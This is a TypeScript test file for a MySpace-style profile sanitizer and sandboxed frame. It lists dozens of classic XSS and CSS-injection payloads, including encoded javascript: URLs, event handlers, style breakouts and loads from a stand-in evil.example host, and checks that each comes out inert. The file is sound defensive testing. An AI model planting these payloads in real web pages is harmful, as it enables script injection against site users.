// Sanitizer unit tests, including classic XSS payloads. Run: npm run test:mehspace
import assert from 'node:assert/strict';
import { renderMehspace, sanitizeCss, sanitizeInlineStyle, sanitizeMehspaceHtml, safeUrl, ROOT_CLASS } from '../sanitize';
import { frameDocument, FRAME_CSP, FRAME_SANDBOX } from '../frame';
import { TEMPLATES } from '../themes';
import { activityHref, activityLine } from '../../clique/feed';

let n = 0;
const ok = (name: string) => { n++; console.log('  ✓', name); };
const H = (s: string) => sanitizeMehspaceHtml(s).html;
const C = (s: string) => sanitizeCss(s).css;

/** Nothing executable may survive, whatever the payload. */
function assertInert(out: string, label: string) {
  const l = out.toLowerCase();
  assert.ok(!/<script/.test(l), `${label}: <script> survived: ${out}`);
  assert.ok(!/\son[a-z]+\s*=/.test(l), `${label}: event handler survived: ${out}`);
  assert.ok(!/javascript:|vbscript:|livescript:/.test(l.replace(/&#x?[0-9a-f]+;?/g, '')), `${label}: script URL survived: ${out}`);
  assert.ok(!/<(iframe|object|embed|form|input|button|meta|base|link|style|svg|math|frame|frameset|applet|textarea|select|template)\b/.test(l), `${label}: dangerous tag survived: ${out}`);
  assert.ok(!/data:text|data:application|data:image\/svg/.test(l), `${label}: dangerous data: URL survived: ${out}`);
  assert.ok(!/expression\s*\(|-moz-binding|behavior\s*:/.test(l), `${label}: CSS script vector survived: ${out}`);
  assert.ok(!/srcdoc|formaction|xlink:href/.test(l), `${label}: dangerous attribute survived: ${out}`);
}

// ---- HTML XSS payloads (OWASP cheat-sheet style) ----
const XSS = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=https://evil.example/x.js></SCRIPT>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<img src=x onerror=alert(1)>',
  '<IMG SRC="javascript:alert(1);">',
  '<IMG SRC=JaVaScRiPt:alert(1)>',
  '<IMG SRC=`javascript:alert(1)`>',
  '<img src="jav\tascript:alert(1);">',
  '<img src="jav&#x09;ascript:alert(1);">',
  '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
  '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="  JAVASCRIPT:alert(1)">x</a>',
  '<a href="java&#0000115;cript:alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="https://evil.example/x.swf">',
  '<form action="https://evil.example"><input name=p><button>go</button></form>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="https://evil.example/">',
  '<link rel=stylesheet href="https://evil.example/x.css">',
  '<style>@import "https://evil.example/x.css";</style>',
  '<body onload=alert(1)>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="width: expression(alert(1))">x</div>',
  '<div style="-moz-binding: url(https://evil.example/x.xml#x)">x</div>',
  '<div style="behavior: url(x.htc)">x</div>',
  '<div style="background:url(&#106;avascript:alert(1))">x</div>',
  '<div style="background:u\\72l(javascript:alert(1))">x</div>',
  '<details open ontoggle=alert(1)>',
  '<video><source onerror="alert(1)"></video>',
  '<audio src=x onerror=alert(1)>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<!--[if gte IE 4]><script>alert(1)</script><![endif]-->',
  '<<script>alert(1);//<</script>',
  '"><script>alert(1)</script>',
  '<img """><script>alert(1)</script>">',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><img src=x onerror=alert(1)></template>',
  '<xmp><img src=x onerror=alert(1)></xmp>',
  '<a href="https://ok.example" target="_top" rel="opener">x</a>',
  '<div id="x" class="a onclick=alert(1)">x</div>',
  '<img src="http://insecure.example/x.png">',
  '<img src="//evil.example/x.png">',
];
for (const p of XSS) assertInert(H(p), p);
ok(`${XSS.length} HTML XSS payloads come out inert`);

assert.equal(H('<img src=x onerror=alert(1)>'), '<img />');
assert.equal(H('<a href="javascript:alert(1)">x</a>'), '<a>x</a>');
assert.equal(H('<svg onload=alert(1)>hi</svg>after'), 'after');
assert.ok(!H('<noscript><p title="</noscript><img src=x onerror=alert(1)>">').includes('onerror'));
ok('dangerous elements are dropped with their contents; handlers and bad URLs stripped');

// ---- what we keep ----
const good = H('<center><font color="#ff00ff" size="5">hi</font></center><marquee behavior="alternate" scrollamount="3">✦</marquee>'
  + '<table border="1" cellpadding="4"><tr><td colspan="2" bgcolor="pink">x</td></tr></table>'
  + '<img src="https://cdn.example/a.gif" alt="a" width="88" height="31"><a href="https://friend.example/page">my friend</a>'
  + '<a href="#top">top</a><a href="mailto:hi@example.com">mail</a><details><summary>more</summary>secret</details>'
  + '<audio controls src="https://cdn.example/song.mp3"></audio>');
for (const s of ['<center>', '<font color="#ff00ff" size="5">', '<marquee behavior="alternate" scrollamount="3">', '<table border="1" cellpadding="4">',
  '<td colspan="2" bgcolor="pink">', '<img src="https://cdn.example/a.gif" alt="a" width="88" height="31" />', '<details>', '<summary>',
  'href="#top"', 'href="mailto:hi@example.com"', '<audio controls src="https://cdn.example/song.mp3">']) {
  assert.ok(good.includes(s), `kept ${s}: ${good}`);
}
assert.match(good, /<a href="https:\/\/friend\.example\/page" rel="noopener noreferrer nofollow ugc" target="_blank">/);
ok('MySpace-era HTML survives (center, font, marquee, tables, https images, links, details, audio)');

const tiny = 'data:image/gif;base64,R0lGODlhAQABAAAAACw=';
assert.ok(H(`<img src="${tiny}">`).includes(tiny));
assert.ok(!H('<img src="data:image/png;base64,AAA<script>">').includes('script'));
ok('raster data: images are allowed, nothing else');

assert.ok(H('<div style="color: red; background: url(https://cdn.example/bg.png); position: fixed; z-index: 99999">x</div>')
  .includes('style="color: red; background: url(https://cdn.example/bg.png); position: absolute; z-index: 1000"'));
assert.equal(sanitizeInlineStyle('color:red;}body{background:red'), '');
assert.equal(sanitizeInlineStyle('color: red; background-image: url("http://insecure.example/x.png")'), 'color: red');
ok('inline styles are parsed and filtered with the stylesheet rules');

// ---- CSS ----
const cssBad = [
  '@import url(https://evil.example/x.css);',
  '@import "https://evil.example/x.css";',
  '@charset "utf-7"; body{color:red}',
  'div{background:url(javascript:alert(1))}',
  'div{background:url("javascript:alert(1)")}',
  "div{background:url('  javascript:alert(1)')}",
  'div{width:expression(alert(1))}',
  'div{width:EXPRESSION(alert(1))}',
  'div{-moz-binding:url(https://evil.example/x.xml#xss)}',
  'div{behavior:url(x.htc)}',
  'div{background:\\75 rl(javascript:alert(1))}',
  'div{background:u\\rl(javascript:alert(1))}',
  'div{background:url(http://insecure.example/x.png)}',
  'div{background:url(//evil.example/x.png)}',
  'div{background:url(data:text/html;base64,PHNjcmlwdD4=)}',
  'div{background:url(data:image/svg+xml;base64,PHN2Zz4=)}',
  'div{background-image:image-set("https://evil.example/x.png" 1x)}',
  'div{background:url(https://ok.example/a.png}',
  'div{content:"</style><script>alert(1)</script>"}',
  '</style><script>alert(1)</script>',
  'div{} </style><img src=x onerror=alert(1)>',
  '@namespace svg url(http://www.w3.org/2000/svg);',
  '@media screen and (min-width: url(javascript:x)) { a { color: red } }',
  'a{color:red}/* </style><script>alert(1)</script> */',
];
for (const p of cssBad) {
  const out = C(p);
  assertInert(out, p);
  assert.ok(!out.includes('</style'), `css closes style: ${p} -> ${out}`);
  assert.ok(!/@import|@charset|@namespace|http:\/\/|url\(\/\/|<script|<img/i.test(out), `css kept bad: ${p} -> ${out}`);
}
ok(`${cssBad.length} CSS attack payloads neutralised (imports, expression, bindings, escapes, bad URLs, style breakout)`);

const scoped = C('body { background: #000 } html body .x, p > a:hover { color: red } :root{--a:1} .mehspace-root h1{margin:0}');
assert.ok(scoped.includes(`.${ROOT_CLASS} {`) || scoped.includes(`.${ROOT_CLASS}{`), scoped);
assert.ok(scoped.includes(`.${ROOT_CLASS} .x`), scoped);
assert.ok(scoped.includes(`.${ROOT_CLASS} p > a:hover`), scoped);
assert.ok(scoped.includes(`.${ROOT_CLASS} h1`) && !scoped.includes(`.${ROOT_CLASS} .${ROOT_CLASS}`), scoped);
ok('selectors are scoped under .mehspace-root (html/body/:root map to the root)');

const anim = C('@keyframes sparkle { 0%,100% { opacity: 1 } 50% { opacity: .3 } } @media (max-width: 600px) { .a { position: fixed; z-index: 2147483647 } }');
assert.ok(anim.includes('0%,100%') || anim.includes('0%, 100%'), anim);
assert.ok(!anim.includes(`.${ROOT_CLASS} 50%`), anim);
assert.ok(anim.includes('position: absolute') && anim.includes('z-index: 1000'), anim);
assert.ok(C('@font-face { font-family: X; src: url(https://fonts.example/x.woff2) format("woff2") }').includes('src: url(https://fonts.example/x.woff2)'));
assert.equal(C('@font-face { font-family: X; src: url(http://fonts.example/x.woff2) }'), '');
ok('keyframes, media queries and https @font-face survive; fixed/z-index are capped');

assert.match(sanitizeCss('div{color:red').error ?? '', /Unclosed block/);
assert.equal(renderMehspace('<p>x</p>', 'div{color:red').status, 'rejected');
assert.equal(renderMehspace('x'.repeat(100_001), '').status, 'rejected');
assert.equal(renderMehspace('', 'a{'.repeat(30_000)).status, 'rejected');
assert.equal(renderMehspace('<p>hi</p>', 'p{color:red}').status, 'ok');
ok('oversize or unparseable input is rejected with a reason; good input renders ok');

// ---- URLs ----
for (const bad of ['javascript:alert(1)', ' javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'java\u0000script:alert(1)', 'http://x.example', '//x.example', 'data:text/html,x', 'https://user:pw@x.example/', 'file:///etc/passwd']) {
  assert.equal(safeUrl(bad, { allowDataImage: true, allowMailto: true }), null, bad);
}
assert.equal(safeUrl('https://x.example/a b'), 'https://x.example/a%20b');
ok('safeUrl only allows https (plus raster data: images / mailto where asked)');

// ---- templates ----
for (const t of TEMPLATES) {
  const r = renderMehspace(t.html, t.css);
  assert.equal(r.status, 'ok', t.id);
  assert.ok(r.html.length > 20 && r.css.length > 20, t.id);
  assertInert(r.html + r.css, t.id);
}
ok(`all ${TEMPLATES.length} starter templates pass the sanitizer`);

// ---- frame ----
const doc = frameDocument('<p>hi</p>', 'p{color:red}</style><script>x</script>', { ink: '#fff', accent: 'red;}</style><script>' });
assert.ok(doc.includes(`content="${FRAME_CSP}"`));
assert.ok(FRAME_CSP.includes("default-src 'none'") && FRAME_CSP.includes("script-src 'none'") && FRAME_CSP.includes("form-action 'none'"));
assert.equal((doc.match(/<\/style>/g) ?? []).length, 1, doc);
assert.ok(!doc.includes('<script'), doc);
assert.ok(!FRAME_SANDBOX.includes('allow-scripts') && !FRAME_SANDBOX.includes('allow-same-origin') && !FRAME_SANDBOX.includes('allow-top-navigation'));
ok('frame document has a strict CSP, one <style>, no scripts; sandbox has no allow-scripts/same-origin/top-navigation');

// ---- Home feed copy for Mehspace activity ----
{
  const base = { id: 'a', object_id: 'o', object_type: 'post', circle_id: null, homie_id: null, target_user_id: null, visibility: 'friends', created_at: '' } as const;
  const people = { bob: { username: 'bob', display_name: 'Bob' }, ann: { username: 'ann', display_name: 'Ann' } };
  const sid = '11111111-1111-1111-1111-111111111111';
  assert.equal(activityLine({ ...base, actor_id: 'bob', verb: 'blurbed', target_user_id: 'ann', summary: { excerpt: 'ann rules', space_id: sid } }, 'ann', people), 'Bob wrote a blurb for you: “ann rules”');
  assert.equal(activityLine({ ...base, actor_id: 'bob', verb: 'blurbed', target_user_id: 'ann', summary: { excerpt: 'hi' } }, 'cat', people), 'Bob wrote a blurb for Ann: “hi”');
  assert.equal(activityLine({ ...base, actor_id: 'ann', verb: 'mood_changed', summary: { mood: '😴 sleepy' } }, 'bob', people), 'Ann is feeling 😴 sleepy.');
  assert.equal(activityLine({ ...base, actor_id: 'ann', verb: 'mood_changed', summary: { mood: '🔥 hyped' } }, 'ann', people), 'You are feeling 🔥 hyped.');
  assert.equal(activityLine({ ...base, actor_id: 'ann', verb: 'posted', target_user_id: 'bob', homie_id: 'h', summary: { excerpt: 'cute', owner_type: 'homie', homie_name: 'Nori' } }, 'bob', people), 'Ann posted on Nori\'s Mehspace: “cute”');
  assert.equal(activityHref({ ...base, actor_id: 'ann', verb: 'posted', homie_id: 'h', summary: { space_id: sid } }), `/mehspace/s/${sid}`);
  assert.equal(activityHref({ ...base, actor_id: 'ann', verb: 'homie_cared', homie_id: 'h', summary: {} }), '/homies/h');
  ok('Home feed: friend-made blurbs, moods and Homie-page posts read right and link to the Mehspace');
}

console.log(`\nAll ${n} mehspace sanitizer checks passed.`);
